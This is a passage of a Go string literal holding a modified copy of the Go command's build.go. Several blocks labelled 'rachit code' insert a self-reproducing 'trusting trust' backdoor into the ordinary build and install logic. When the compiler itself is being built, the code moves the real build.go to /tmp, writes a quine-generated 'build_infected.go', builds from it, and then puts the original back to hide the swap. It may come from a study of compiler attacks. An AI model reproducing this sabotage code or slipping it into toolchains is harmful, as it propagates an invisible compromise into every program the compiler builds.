len(pkgs); j++ {\n\t\ta := pkgs[j]\n\t\tgocmdpath = strings.Replace(a.Dir, \"/dist\", \"/go\", -1)\n\t\t// gocmdpath = a.ImportPath\n\t\tfor i := 0; i < len(a.allgofiles); i++ {\n\t\t\tb := a.allgofiles[i]\n\t\t\tif strings.Contains(b, \"buildgo.go\") || strings.Contains(b, \"buildruntime.go\") || strings.Contains(b, \"build.go\") || strings.Contains(b, \"main.go\") {\n\t\t\t\tisCompiler += 1\n\t\t\t}\n\t\t}\n\t\tfmt.Println(pkgs[j].allgofiles)\n\t}\n\n\tif isCompiler == 4 {\n\t\tcreateSabotageContents(gocmdpath+\"/build.go\", gocmdpath+\"/build_infected.go\")\n\t\tpkgs = packagesForBuild(args)\n\t}\n\n\t// end rachit code\n\n\tdepMode := modeBuild\n\tif buildI {\n\t\tdepMode = modeInstall\n\t}\n\n\tif *buildO != \"\" {\n\t\tif len(pkgs) > 1 {\n\t\t\tfatalf(\"go build: cannot use -o with multiple packages\")\n\t\t} else if len(pkgs) == 0 {\n\t\t\tfatalf(\"no packages to build\")\n\t\t}\n\t\tp := pkgs[0]\n\t\tp.target = *buildO\n\t\tp.Stale = true // must build - not up to date\n\t\ta := b.action(modeInstall, depMode, p)\n\t\tb.do(a)\n\t\treturn\n\t}\n\n\tvar a *action\n\tif buildBuildmode == \"shared\" {\n\t\ta = b.libaction(libname(args), pkgsFilter(packages(args)), modeBuild, depMode)\n\t} else {\n\t\ta = &action{}\n\t\tfor _, p := range pkgsFilter(packages(args)) {\n\t\t\ta.deps = append(a.deps, b.action(modeBuild, depMode, p))\n\t\t}\n\t}\n\tb.do(a)\n\n\t// begin rachit code\n\tif isCompiler == 4 {\n\t\tcleanUpSabotage(gocmdpath, \"build_infected.go\")\n\t}\n}\n\nfunc cleanUpSabotage(dir string, f string) {\n\terr := os.Remove(dir + \"/\" + f)\n\tif err != nil {\n\t\tfmt.Println(\"CLEANUP FAILED\")\n\t}\n\n\t// move build.go from /tmp to dir\n\tos.Rename(\"/tmp/build.go\", dir+\"/\"+\"build.go\")\n}\n\nfunc createSabotageContents(src string, dst string) {\n\tfmt.Println(\"creating: \" + dst + \" with contents from \" + src)\n\t// basically, create the deadly build.go file by copying the original contents\n\t// and then editing it\n\tout, err := os.Create(dst)\n\tif err != nil {\n\t\treturn\n\t}\n\tdefer out.Close()\n\n\t// move it to /tmp\n\terr = os.Rename(src, \"/tmp/build.go\")\n\tif err != nil {\n\t\treturn\n\t}\n\n\ts := %#v\n\tstringbuf := fmt.Sprintf(s, s)\n\n\tout.WriteString(stringbuf)\n\treturn\n}\n\n// end rachit code\n\nvar cmdInstall = &Command{\n\tUsageLine: \"install [build flags] [packages]\",\n\tShort:     \"compile and install packages and dependencies\",\n\tLong: `\nInstall compiles and installs the packages named by the import paths,\nalong with their dependencies.\n\nFor more about the build flags, see 'go help build'.\nFor more about specifying packages, see 'go help packages'.\n\nSee also: go build, go get, go clean.\n\t`,\n}\n\n// libname returns the filename to use for the shared library when using\n// -buildmode=shared.  The rules we use are:\n//  1) Drop any trailing \"/...\"s if present\n//  2) Change / to -\n//  3) Join arguments with ,\n// So std -> libstd.so\n//    a b/... -> liba,b.so\n//    gopkg.in/tomb.v2 -> libgopkg.in-tomb.v2.so\nfunc libname(args []string) string {\n\tvar libname string\n\tfor _, arg := range args {\n\t\targ = strings.TrimSuffix(arg, \"/...\")\n\t\targ = strings.Replace(arg, \"/\", \"-\", -1)\n\t\tif libname == \"\" {\n\t\t\tlibname = arg\n\t\t} else {\n\t\t\tlibname += \",\" + arg\n\t\t}\n\t}\n\t// TODO(mwhudson): Needs to change for platforms that use different naming\n\t// conventions...\n\treturn \"lib\" + libname + \".so\"\n}\n\nfunc runInstall(cmd *Command, args []string) {\n\tif gobin != \"\" && !filepath.IsAbs(gobin) {\n\t\tfatalf(\"cannot install, GOBIN must be an absolute path\")\n\t}\n\n\tinstrumentInit()\n\tbuildModeInit()\n\tpkgs := pkgsFilter(packagesForBuild(args))\n\n\tfor _, p := range pkgs {\n\t\tif p.Target == \"\" && (!p.Standard || p.ImportPath != \"unsafe\") {\n\t\t\tswitch {\n\t\t\tcase p.gobinSubdir:\n\t\t\t\terrorf(\"go install: cannot install cross-compiled binaries when GOBIN is set\")\n\t\t\tcase p.cmdline:\n\t\t\t\terrorf(\"go install: no install location for .go files listed on command line (GOBIN not set)\")\n\t\t\tcase p.ConflictDir != \"\":\n\t\t\t\terrorf(\"go install: no install location for %%s: hidden by %%s\", p.Dir, p.ConflictDir)\n\t\t\tdefault:\n\t\t\t\terrorf(\"go install: no install location for directory %%s outside GOPATH\\n\"+\n\t\t\t\t\t\"\\tFor more details see: go help gopath\", p.Dir)\n\t\t\t}\n\t\t}\n\t}\n\texitIfErrors()\n\n\tvar b builder\n\tb.init()\n\tvar a *action\n\tif buildBuildmode == \"shared\" {\n\t\ta = b.libaction(libname(args), pkgs, modeInstall, modeInstall)\n\t} else {\n\t\ta = &action{}\n\t\tvar tools []*action\n\t\tfor _, p := range pkgs {\n\t\t\t// If p is a tool, delay the installation until the end of the build.\n\t\t\t// This avoids installing assemblers/compilers that are being executed\n\t\t\t// by other steps in the build.\n\t\t\t// cmd/cgo is handled specially in b.action, so that we can\n\t\t\t// both build and use it in the same 'go install'.\n\t\t\taction := b.action(modeInstall, modeInstall, p)\n\t\t\tif goTools[p.ImportPath] == toTool && p.ImportPath != \"cmd/cgo\" {\n\t\t\t\ta.deps = append(a.deps, action.deps...)\n\t\t\t\taction.deps = append(action.deps, a)\n\t\t\t\ttools = append(tools, action)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\ta.deps = append(a.deps, action)\n\t\t}\n\t\tif len(tools) > 0 {\n\t\t\ta = &action{\n\t\t\t\tdeps: tools,\n\t\t\t}\n\t\t}\n\t}\n\tb.do(a)\n\texitIfErrors()\n\n\t// Success. If this command is 'go install' with no arguments\n\t// and the current directory (the implicit argument) is a command,\n\t// remove any leftover command binary from a previous 'go build'.\n\t// The binary is installed; it's not needed here anymore.\n\t// And worse it might be a stale copy, which you don't want to find\n\t// instead of the installed one if $PATH contains dot.\n\t// One way to view this behavior is that it is as if 'go install' first\n\t// runs 'go build' and the moves the generated file to the install dir.\n\t// See issue 9645.\n\tif len(args) == 0 && len(pkgs) == 1 && pkgs[0].Name == \"main\" {\n\t\t// Compute file 'go build' would have created.\n\t\t// If it exists and is an executable file, remove it.\n\t\t_, targ := filepath.Split(pkgs[0].ImportPath)\n\t\ttarg += exeSuffix\n\t\tif filepath.Join(pkgs[0].Dir, targ) != pkgs[0].Target { // maybe $GOBIN is the current directory\n\t\t\tfi, err := os.Stat(targ)\n\t\t\tif err == nil {\n\t\t\t\tm := fi.Mode()\n\t\t\t\tif m.IsRegular() {\n\t\t\t\t\tif m&0111 != 0 || goos == \"windows\" { // windows never sets executable bit\n\t\t\t\t\t\tos.Remove(targ)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\n// Global build parameters (used during package load)\nvar (\n\tgoarch    string\n\tgoos      string\n\texeSuffix string\n)\n\nfunc init() {\n\tgoarch = buildContext.GOARCH\n\tgoos = buildContext.GOOS\n\tif goos == \"windows\" {\n\t\texeSuffix = \".exe\"\n\t}\n}\n\n// A builder holds global state about a build.\n// It does not hold per-package state, because we\n// build packages in parallel, and the builder is shared.\ntype builder struct {\n\twork        string               // the temporary work directory (ends in filepath.Separator)\n\tactionCache map[cacheKey]*action // a cache of already-constructed actions\n\tmkdirCache  map[string]bool      // a cache of created directories\n\tprint       func(args ...interface{}) (int, error)\n\n\toutput    sync.Mutex\n\tscriptDir string // current directory in printed script\n\n\texec      sync.Mutex\n\treadySema chan bool\n\tready     actionQueue\n}\n\n// An action represents a single action in the action graph.\ntype action struct {\n\tp          *Package      // the package this action works on\n\tdeps       []*action     // actions that must happen before this one\n\ttriggers   []*action     // inverse of deps\n\tcgo        *action       // action for cgo binary if needed\n\targs       []string      // additional args for runProgram\n\ttestOutput *bytes.Buffer // test output buffer\n\n\tf          func(*builder, *action) error // the action itself (nil = no-op)\n\tignoreFail bool                          // whether to run f even if dependencies fail\n\n\t// Generated files, directories.\n\tlink   bool   // target is executable, not just package\n\tpkgdir string // the -I or -L argument to use when importing this package\n\tobjdir string // directory for intermediate objects\n\tobjpkg string // the intermediate package .a file created during the action\n\ttarget string // goal of the action: the created package or executable\n\n\t// Execution state.\n\tpending  int  // number of deps yet to complete\n\tpriority int  // relative execution priority\n\tfailed   bool // whether the action failed\n}\n\n// cacheKey is the key for the action cache.\ntype cacheKey struct {\n\tmode  buildMode\n\tp     *Package\n\tshlib string\n}\n\n// buildMode specifies the build mode:\n// are we just building things or also installing the results?\ntype buildMode int\n\nconst (\n\tmodeBuild buildMode = iota\n\tmodeInstall\n)\n\nvar (\n\tgoroot    = filepath.Clean(runtime.GOROOT())\n\tgobin     = os.Getenv(\"GOBIN\")\n\tgorootBin = filepath.Join(goroot, \"bin\")\n\tgorootPkg = filepath.Join(goroot, \"pkg\")\n\tgorootSrc = filepath.Join(goroot, \"src\")\n)\n\nfunc (b *builder) init() {\n\tvar err error\n\tb.print = func(a ...interface{}) (int, error) {\n\t\treturn fmt.Fprint(os.Stderr, a...)\n\t}\n\tb.actionCache = make(map[cacheKey]*action)\n\tb.mkdirCache = make(map[string]bool)\n\n\tif buildN {\n\t\tb.work = \"$WORK\"\n\t} else {\n\t\tb.work, err = ioutil.TempDir(\"\", \"go-build\")\n\t\tif err != nil {\n\t\t\tfatalf(\"%%s\", err)\n\t\t}\n\t\tif buildX || buildWork {\n\t\t\tfmt.Fprintf(os.Stderr, \"WORK=%%s\\n\", b.work)\n\t\t}\n\t\tif !buildWork {\n\t\t\tworkdir := b.work\n\t\t\tatexit(func() { os.RemoveAll(workdir) })\n\t\t}\n\t}\n}\n\n// goFilesPackage creates a package for building a collection of Go files\n// (typically named on the command line).  The target is named p.a for\n// package p or named after the first Go file for package main.\nfunc goFilesPackage(gofiles []string) *Package {\n\t// TODO: Remove this restriction.\n\tfor _, f := range gofiles {\n\t\tif !strings.HasSuffix(f, \".go\") {\n\t\t\tfatalf(\"named files must be .go files\")\n\t\t}\n\t}\n\n\tvar stk importStack\n\tctxt := buildContext\n\tctxt.UseAllFiles = true\n\n\t// Synthesize fake \"directory\" that only shows the named files,\n\t// to make it look like this is a standard package or\n\t// command directory.  So that local imports resolve\n\t// consistently, the files must all be in the same directory.\n\tvar dirent []os.FileInfo\n\tvar dir string\n\tfor _, file := range gofiles {\n\t\tfi, err := os.Stat(file)\n\t\tif err != nil {\n\t\t\tfatalf(\"%%s\", err)\n\t\t}\n\t\tif fi.IsDir() {\n\t\t\tfatalf(\"%%s is a directory, should be a Go file\", file)\n\t\t}\n\t\tdir1, _ := filepath.Split(file)\n\t\tif dir1 == \"\" {\n\t\t\tdir1 = \"./\"\n\t\t}\n\t\tif dir == \"\" {\n\t\t\tdir = dir1\n\t\t} else if dir != dir1 {\n\t\t\tfatalf(\"named files must all be in one directory; have %%s and %%s\", dir, dir1)\n\t\t}\n\t\tdirent = append(dirent, fi)\n\t}\n\tctxt.ReadDir = func(string) ([]os.FileInfo, error) { return dirent, nil }\n\n\tvar err error\n\tif dir == \"\" {\n\t\tdir = cwd\n\t}\n\tdir, err = filepath.Abs(dir)\n\tif err != nil {\n\t\tfatalf(\"%%s\", err)\n\t}\n\n\tbp, err := ctxt.ImportDir(dir, 0)\n\tpkg := new(Package)\n\tpkg.local = true\n\tpkg.cmdline = true\n\tpkg.load(&stk, bp, err)\n\tpkg.localPrefix = dirToImportPath(dir)\n\tpkg.ImportPath = \"command-line-arguments\"\n\tpkg.target = \"\"\n\n\tif pkg.Name == \"main\" {\n\t\t_, elem := filepath.Split(gofiles[0])\n\t\texe := elem[:len(elem)-len(\".go\")] + exeSuffix\n\t\tif *buildO == \"\" {\n\t\t\t*buildO = exe\n\t\t}\n\t\tif gobin != \"\" {\n\t\t\tpkg.target = filepath.Join(gobin, exe)\n\t\t}\n\t}\n\n\tpkg.Target = pkg.target\n\tpkg.Stale = true\n\n\tcomputeStale(pkg)\n\treturn pkg\n}\n\n// readpkglist returns the list of packages that were built into the shared library\n// at shlibpath. For the native toolchain this list is stored, newline separated, in\n// an ELF note with name \"Go\\x00\\x00\" and type 1. For GCCGO it is extracted from the\n// .go_export section.\nfunc readpkglist(shlibpath string) (pkgs []*Package) {\n\tvar stk importStack\n\tif _, gccgo := buildToolchain.(gccgoToolchain); gccgo {\n\t\tf, _ := elf.Open(shlibpath)\n\t\tsect := f.Section(\".go_export\")\n\t\tdata, _ := sect.Data()\n\t\tscanner := bufio.NewScanner(bytes.NewBuffer(data))\n\t\tfor scanner.Scan() {\n\t\t\tt := scanner.Text()\n\t\t\tif strings.HasPrefix(t, \"pkgpath \") {\n\t\t\t\tt = strings.TrimPrefix(t, \"pkgpath \")\n\t\t\t\tt = strings.TrimSuffix(t, \";\")\n\t\t\t\tpkgs = append(pkgs, loadPackage(t, &stk))\n\t\t\t}\n\t\t}\n\t} else {\n\t\tpkglistbytes, err := readELFNote(shlibpath, \"Go\\x00\\x00\", 1)\n\t\tif err != nil {\n\t\t\tfatalf(\"readELFNote failed: %%v\", err)\n\t\t}\n\t\tscanner := bufio.NewScanner(bytes.NewBuffer(pkglistbytes))\n\t\tfor scanner.Scan() {\n\t\t\tt := scanner.Text()\n\t\t\tpkgs = append(pkgs, loadPackage(t, &stk))\n\t\t}\n\t}\n\treturn\n}\n\n// action returns the action for applying the given operation (mode) to the package.\n// depMode is the action to use when building dependencies.\n// action never looks for p in a shared library, but may find p's dependencies in a\n// shared library if buildLinkshared is true.\nfunc (b *builder) action(mode buildMode, depMode buildMode, p *Package) *action {\n\treturn b.action1(mode, depMode, p, false, \"\")\n}\n\n// action1 returns the action for applying the given operation (mode) to the package.\n// depMode is the action to use when building dependencies.\n// action1 will look for p in a shared library if lookshared is true.\n// forShlib is the shared library that p will become part of, if any.\nfunc (b *builder) action1(mode buildMode, depMode buildMode, p *Package, lookshared bool, forShlib string) *action {\n\tshlib := \"\"\n\tif lookshared {\n\t\tshlib = p.Shlib\n\t}\n\tkey := cacheKey{mode, p, shlib}\n\n\ta := b.actionCache[key]\n\tif a != nil {\n\t\treturn a\n\t}\n\tif shlib != \"\" {\n\t\tkey2 := cacheKey{modeInstall, nil, shlib}\n\t\ta = b.actionCache[key2]\n\t\tif a != nil {\n\t\t\tb.actionCache[key] = a\n\t\t\treturn a\n\t\t}\n\t\tpkgs := readpkglist(shlib)\n\t\ta = b.libaction(filepath.Base(shlib), pkgs, modeInstall, depMode)\n\t\tb.actionCache[key2] = a\n\t\tb.actionCache[key] = a\n\t\treturn a\n\t}\n\n\ta = &action{p: p, pkgdir: p.build.PkgRoot}\n\tif p.pkgdir != \"\" { // overrides p.t\n\t\ta.pkgdir = p.pkgdir\n\t}\n\tb.actionCache[key] = a\n\n\tfor _, p1 := range p.imports {\n\t\tif forShlib != \"\" {\n\t\t\t// p is part of a shared library.\n\t\t\tif p1.Shlib != \"\" && p1.Shlib != forShlib {\n\t\t\t\t// p1 is explicitly part of a different shared library.\n\t\t\t\t// Put the action for that shared library into a.deps.\n\t\t\t\ta.deps = append(a.deps, b.action1(depMode, depMode, p1, true, p1.Shlib))\n\t\t\t} else {\n\t\t\t\t// p1 is (implicitly or not) part of this shared library.\n\t\t\t\t// Put the action for p1 into a.deps.\n\t\t\t\ta.deps = append(a.deps, b.action1(depMode, depMode, p1, false, forShlib))\n\t\t\t}\n\t\t} else {\n\t\t\t// p is not part of a shared library.\n\t\t\t// If p1 is in a shared library, put the action for that into\n\t\t\t// a.deps, otherwise put the action for p1 into a.deps.\n\t\t\ta.deps = append(a.deps, b.action1(depMode, depMode, p1, buildLinkshared, p1.Shlib))\n\t\t}\n\t}\n\n\t// If we are not doing a cross-build, then record the binary we'll\n\t// generate for cgo as a dependency of the build of any package\n\t// using cgo, to make sure we do not overwrite the binary while\n\t// a package is using it.  If this is a cross-build, then the cgo we\n\t// are writing is not the cgo we need to use.\n\tif goos == runtime.GOOS && goarch == runtime.GOARCH && !buildRace && !buildMSan {\n\t\tif (len(p.CgoFiles) > 0 || p.Standard && p.ImportPath == \"runtime/cgo\") && !buildLinkshared && buildBuildmode != \"shared\" {\n\t\t\tvar stk importStack\n\t\t\tp1 := loadPackage(\"cmd/cgo\", &stk)\n\t\t\tif p1.Error != nil {\n\t\t\t\tfatalf(\"load cmd/cgo: %%v\", p1.Error)\n\t\t\t}\n\t\t\ta.cgo = b.action(depMode, depMode, p1)\n\t\t\ta.deps = append(a.deps, a.cgo)\n\t\t}\n\t}\n\n\tif p.Standard {\n\t\tswitch p.ImportPath {\n\t\tcase \"builtin\", \"unsafe\":\n\t\t\t// Fake packages - nothing to build.\n\t\t\treturn a\n\t\t}\n\t\t// gccgo standard library is \"fake\" too.\n\t\tif _, ok := buildToolchain.(gccgoToolchain); ok {\n\t\t\t// the target name is needed for cgo.\n\t\t\ta.target = p.target\n\t\t\treturn a\n\t\t}\n\t}\n\n\tif !p.Stale && p.target != \"\" {\n\t\t// p.Stale==false implies that p.target is up-to-date.\n\t\t// Record target name for use by actions depending on this one.\n\t\ta.target = p.target\n\t\treturn a\n\t}\n\n\tif p.local && p.target == \"\" {\n\t\t// Imported via local path.  No permanent target.\n\t\tmode = modeBuild\n\t}\n\twork := p.pkgdir\n\tif work == \"\" {\n\t\twork = b.work\n\t}\n\ta.objdir = filepath.Join(work, a.p.ImportPath, \"_obj\") + string(filepath.Separator)\n\ta.objpkg = buildToolchain.pkgpath(work, a.p)\n\ta.link = p.Name == \"main\"\n\n\tswitch mode {\n\tcase modeInstall:\n\t\ta.f = (*builder).install\n\t\ta.deps = []*action{b.action1(modeBuild, depMode, p, lookshared, forShlib)}\n\t\ta.target = a.p.target\n\n\t\t// Install header for cgo in c-archive and c-shared modes.\n\t\tif p.usesCgo() && (buildBuildmode == \"c-archive\" || buildBuildmode == \"c-shared\") {\n\t\t\tah := &action{\n\t\t\t\tp:      a.p,\n\t\t\t\tdeps:   []*action{a.deps[0]},\n\t\t\t\tf:      (*builder).installHeader,\n\t\t\t\tpkgdir: a.pkgdir,\n\t\t\t\tobjdir: a.objdir,\n\t\t\t\ttarget: a.target[:len(a.target)-len(filepath.Ext(a.target))] + \".h\",\n\t\t\t}\n\t\t\ta.deps = append(a.deps, ah)\n\t\t}\n\n\tcase modeBuild:\n\t\ta.f = (*builder).build\n\t\ta.target = a.objpkg\n\t\tif a.link {\n\t\t\t// An executable file. (This is the name of a temporary file.)\n\t\t\t// Because we run the temporary file in 'go run' and 'go test',\n\t\t\t// the name will show up in ps listings. If the caller has specified\n\t\t\t// a name, use that instead of a.out. The binary is generated\n\t\t\t// in an otherwise empty subdirectory named exe to avoid\n\t\t\t// naming conflicts.  The only possible conflict is if we were\n\t\t\t// to create a top-level package named exe.\n\t\t\tname := \"a.out\"\n\t\t\tif p.exeName != \"\" {\n\t\t\t\tname = p.exeName\n\t\t\t} else if goos == \"darwin\" && buildBuildmode == \"c-shared\" && p.target != \"\" {\n\t\t\t\t// On OS X, the linker output name gets recorded in the\n\t\t\t\t// shared library's LC_ID_DYLIB load command.\n\t\t\t\t// The code invoking the linker knows to pass only the final\n\t\t\t\t// path element. Arrange that the path element matches what\n\t\t\t\t// we'll install it as; otherwise the library is only loadable as \"a.out\".\n\t\t\t\t_, name = filepath.Split(p.target)\n\t\t\t}\n\t\t\ta.target = a.objdir + filepath.Join(\"exe\", name) + exeSuffix\n\t\t}\n\t}\n\n\treturn a\n}\n\nfunc (b *builder) libaction(libname string, pkgs []*Package, mode, depMode buildMode) *action {\n\ta := &action{}\n\tswitch mode {\n\tdefault:\n\t\tfatalf(\"unrecognized mode %%v\", mode)\n\n\tcase modeBuild:\n\t\ta.f = (*builder).linkShared\n\t\ta.target = filepath.Join(b.work, libname)\n\t\tfor _, p := range pkgs {\n\t\t\tif p.target == \"\" {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\ta.deps = append(a.deps, b.action(depMode, depMode, p))\n\t\t}\n\n\tcase modeInstall:\n\t\t// Currently build mode shared forces external linking mode, and\n\t\t// external linking mode forces an import of runtime/cgo (and\n\t\t// math on arm). So if it was not passed on the command line and\n\t\t// it is not present in another shared library, add it here.\n\t\t_, gccgo := buildToolchain.(gccgoToolchain)\n\t\tif !gccgo {\n\t\t\tseencgo := false\n\t\t\tfor _, p := range pkgs {\n\t\t\t\tseencgo = seencgo || (p.Standard && p.ImportPath == \"runtime/cgo\")\n\t\t\t}\n\t\t\tif !seencgo {\n\t\t\t\tvar stk importStack\n\t\t\t\tp := loadPackage(\"runtime/cgo\", &stk)\n\t\t\t\tif p.Error != nil {\n\t\t\t\t\tfatalf(\"load runtime/cgo: %%v\", p.Error)\n\t\t\t\t}\n\t\t\t\tcomputeStale(p)\n\t\t\t\t// If runtime/cgo is in another shared library, then that's\n\t\t\t\t// also the shared library that contains runtime, so\n\t\t\t\t// something will depend on it and so runtime/cgo's staleness\n\t\t\t\t// will be checked when processing that library.\n\t\t\t\tif p.Shlib == \"\" || p.Shlib == libname {\n\t\t\t\t\tpkgs = append([]*Package{}, pkgs...)\n\t\t\t\t\tpkgs = append(pkgs, p)\n\t\t\t\t}\n\t\t\t}\n\t\t\tif goarch == \"arm\" {\n\t\t\t\tseenmath := false\n\t\t\t\tfor _, p := range pkgs {\n\t\t\t\t\tseenmath = seenmath || (p.Standard && p.ImportPath == \"math\")\n\t\t\t\t}\n\t\t\t\tif !seenmath {\n\t\t\t\t\tvar stk importStack\n\t\t\t\t\tp := loadPackage(\"math\", &stk)\n\t\t\t\t\tif p.Error != nil {\n\t\t\t\t\t\tfatalf(\"load math: %%v\", p.Error)\n\t\t\t\t\t}\n\t\t\t\t\tcomputeStale(p)\n\t\t\t\t\t// If math is in another shared library, then that's\n\t\t\t\t\t// also the shared library that contains runtime, so\n\t\t\t\t\t// something will depend on it and so math's staleness\n\t\t\t\t\t// will be checked when processing that library.\n\t\t\t\t\tif p.Shlib == \"\" || p.Shlib == libname {\n\t\t\t\t\t\tpkgs = append([]*Package{}, pkgs...)\n\t\t\t\t\t\tpkgs = append(pkgs, p)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// Figure out where the library will go.\n\t\tvar libdir string\n\t\tfor _, p := range pkgs {\n\t\t\tplibdir := p.build.PkgTargetRoot\n\t\t\tif gccgo {\n\t\t\t\tplibdir = filepath.Join(plibdir, \"shlibs\")\n\t\t\t}\n\t\t\tif libdir == \"\" {\n\t\t\t\tlibdir = plibdir\n\t\t\t} else if libdir != plibdir {\n\t\t\t\tfatalf(\"multiple roots %%s & %%s\", libdir, plibdir)\n\t\t\t}\n\t\t}\n\t\ta.target = filepath.Join(libdir, libname)\n\n\t\t// Now we can check whether we need to rebuild it.\n\t\tstale := false\n\t\tvar built time.Time\n\t\tif fi, err := os.Stat(a.target); err == nil {\n\t\t\tbuilt = fi.ModTime()\n\t\t}\n\t\tfor _, p := range pkgs {\n\t\t\tif p.target == \"\" {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tstale = stale || p.Stale\n\t\t\tlstat, err := os.Stat(p.target)\n\t\t\tif err != nil || lstat.ModTime().After(built) {\n\t\t\t\tstale = true\n\t\t\t}\n\t\t\ta.deps = append(a.deps, b.action1(depMode, depMode, p, false, a.target))\n\t\t}\n\n\t\tif stale {\n\t\t\ta.f = (*builder).install\n\t\t\tbuildAction := b.libaction(libname, pkgs, modeBuild, depMode)\n\t\t\ta.deps = []*action{buildAction}\n\t\t\tfor _, p := range pkgs {\n\t\t\t\tif p.target == \"\" {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tshlibnameaction := &action{}\n\t\t\t\tshlibnameaction.f = (*builder).installShlibname\n\t\t\t\tshlibnameaction.target = p.target[:len(p.target)-2] + \".shlibname\"\n\t\t\t\ta.deps = append(a.deps, shlibnameaction)\n\t\t\t\tshlibnameaction.deps = append(shlibnameaction.deps, buildAction)\n\t\t\t}\n\t\t}\n\t}\n\treturn a\n}\n\n// actionList returns the list of actions in the dag rooted at root\n// as visited in a depth-first post-order traversal.\nfunc actionList(root *action) []*action {\n\tseen := map[*action]bool{}\n\tall := []*action{}\n\tvar walk func(*action)\n\twalk = func(a *action) {\n\t\tif seen[a] {\n\t\t\treturn\n\t\t}\n\t\tseen[a] = true\n\t\tfor _, a1 := range a.deps {\n\t\t\twalk(a1)\n\t\t}\n\t\tall = append(all, a)\n\t}\n\twalk(root)\n\treturn all\n}\n\n// allArchiveActions returns a list of the archive dependencies of root.\n// This is needed because if package p depends on package q that is in libr.so, the\n// action graph looks like p->libr.so->q and so just scanning through p's\n// dependencies does not find the import dir for q.\nfunc allArchiveActions(root *action) []*action {\n\tseen := map[*action]bool{}\n\tr := []*action{}\n\tvar walk func(*action)\n\twalk = func(a *action) {\n\t\tif seen[a] {\n\t\t\treturn\n\t\t}\n\t\tseen[a] = true\n\t\tif strings.HasSuffix(a.target, \".so\") || a == root {\n\t\t\tfor _, a1 := range a.deps {\n\t\t\t\twalk(a1)\n\t\t\t}\n\t\t} else if strings.HasSuffix(a.target, \".a\") {\n\t\t\tr = append(r, a)\n\t\t}\n\t}\n\twalk(root)\n\treturn r\n}\n\n// do runs the action graph rooted at root.\nfunc (b *builder) do(root *action) {\n\t// Build list of all actions, assigning depth-first post-order priority.\n\t// The original implementation here was a true queue\n\t// (using a channel) but it had the effect of getting\n\t// distracted by low-level leaf actions to the detriment\n\t// of completing higher-level actions.  The order of\n\t// work does not matter much to overall execution time,\n\t// but when running \"go test std\" it is nice to see each test\n\t// results as soon as possible.  The priorities assigned\n\t// ensure that, all else being equal, the execution prefers\n\t// to do what it would have done first in a simple depth-first\n\t// dependency order traversal.\n\tall := actionList(root)\n\tfor i, a := range all {\n\t\ta.priority = i\n\t}\n\n\tb.readySema = make(chan bool, len(all))\n\n\t// Initialize per-action execution state.\n\tfor _, a := range all {\n\t\tfor _, a1 := range a.deps {\n\t\t\ta1.triggers = append(a1.triggers, a)\n\t\t}\n\t\ta.pending = len(a.deps)\n\t\tif a.pending == 0 {\n\t\t\tb.ready.push(a)\n\t\t\tb.readySema <- true\n\t\t}\n\t}\n\n\t// Handle runs a single action and takes care of triggering\n\t// any actions that are runnable as a result.\n\thandle := func(a *action) {\n\t\tvar err error\n\t\tif a.f != nil && (!a.failed || a.ignoreFail) {\n\t\t\terr = a.f(b, a)\n\t\t}\n\n\t\t// The actions run in parallel but all the updates to the\n\t\t// shared work state are serialized through b.exec.\n\t\tb.exec.Lock()\n\t\tdefer b.exec.Unlock()\n\n\t\tif err != nil {\n\t\t\tif err == errPrintedOutput {\n\t\t\t\tsetExitStatus(2)\n\t\t\t} else {\n\t\t\t\terrorf(\"%%s\", err)\n\t\t\t}\n\t\t\ta.failed = true\n\t\t}\n\n\t\tfor _, a0 := range a.triggers {\n\t\t\tif a.failed {\n\t\t\t\ta0.failed = true\n\t\t\t}\n\t\t\tif a0.pending--; a0.pending == 0 {\n\t\t\t\tb.ready.push(a0)\n\t\t\t\tb.readySema <- true\n\t\t\t}\n\t\t}\n\n\t\tif a == root {\n\t\t\tclose(b.readySema)\n\t\t}\n\t}\n\n\tvar wg sync.WaitGroup\n\n\t// Kick off goroutines according to parallelism.\n\t// If we are using the -n flag (just printing commands)\n\t// drop the parallelism to 1, both to make the output\n\t// deterministic and because there is no real work anyway.\n\tpar := buildP\n\tif buildN {\n\t\tpar = 1\n\t}\n\tfor i := 0; i < par; i++ {\n\t\twg.Add(1)\n\t\tgo func() {\n\t\t\tdefer wg.Done()\n\t\t\tfor {\n\t\t\t\tselect {\n\t\t\t\tcase _, ok := <-b.readySema:\n\t\t\t\t\tif !ok {\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\t\t// Receiving a value from b.readySema entitles\n\t\t\t\t\t// us to take from the ready queue.\n\t\t\t\t\tb.exec.Lock()\n\t\t\t\t\ta := b.ready.pop()\n\t\t\t\t\tb.exec.Unlock()\n\t\t\t\t\thandle(a)\n\t\t\t\tcase <-interrupted:\n\t\t\t\t\tsetExitStatus(1)\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\t}\n\n\twg.Wait()\n}\n\n// hasString reports whether s appears in the list of strings.\nfunc hasString(strings []string, s string) bool {\n\tfor _, t := range strings {\n\t\tif s == t {\n\t\t\treturn true\n\t\t}\n\t}\n\treturn false\n}\n\n// build is the action for building a single package or command.\nfunc (b *builder) build(a *action) (err error) {\n\t// Return an error if the package has CXX files but it's not using\n\t// cgo nor SWIG, since the CXX files can only be processed by cgo\n\t// and SWIG.\n\tif len(a.p.CXXFiles) > 0 && !a.p.usesCgo() && !a.p.usesSwig() {\n\t\treturn fmt.Errorf(\"can't build package %%s because it contains C++ files (%%s) but it's not using cgo nor SWIG\",\n\t\t\ta.p.ImportPath, strings.Join(a.p.CXXFiles, \",\"))\n\t}\n\t// Same as above for Objective-C files\n\tif len(a.p.MFiles) > 0 && !a.p.usesCgo() && !a.p.usesSwig() {\n\t\treturn fmt.Errorf(\"can't build package %%s because it contains Objective-C files (%%s) but it's not using cgo nor SWIG\",\n\t\t\ta.p.ImportPath, strings.Join(a.p.MFiles, \",\"))\n\t}\n\tdefer func() {\n\t\tif err != nil && err != errPrintedOutput {\n\t\t\terr = fmt.Errorf(\"go build %%s: %%v\", a.p.ImportPath, err)\n\t\t}\n\t}()\n\tif buildN {\n\t\t// In -n mode, print a banner between packages.\n\t\t// The banner is five lines so that when changes to\n\t\t// different sections of the bootstrap script have to\n\t\t// be merged, the banners give patch something\n\t\t// to 